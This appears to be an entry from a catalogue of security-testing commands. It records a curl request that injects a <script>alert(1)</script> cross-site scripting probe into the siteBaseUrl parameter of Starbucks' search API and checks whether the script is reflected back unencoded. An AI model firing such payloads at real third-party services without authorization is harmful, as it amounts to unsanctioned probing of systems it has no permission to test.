---
data: >-
  curl
  "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://example.com/<script>alert(1)</script>"
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.117Z'
id: 2404d772-8c76-4505-b008-51450d5646db
verified: false
validated: true
submitted: true
---
# test-sitebaseurl-reflection

## Command

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://example.com/<script>alert(1)</script>"
```

## Description

Tests the siteBaseUrl parameter for reflection by injecting a script tag and checking if it's echoed back unsanitized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| x-api-key | API key | Yes |
| query | Search query | Yes |
| partnerid | Partner ID | Yes |
| siteBaseUrl | Payload-injected URL | Yes |

## Examples

### Basic Usage

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=yourkey&query=coffe&partnerid=yourid&siteBaseUrl=http://example.com/<script>alert(1)</script>"
```

## Expected Output

Response containing the injected <script>alert(1)</script> without encoding, potentially triggering in browser.

## Related

- [[commands/inject-xss-payload-sitebaseurl]]
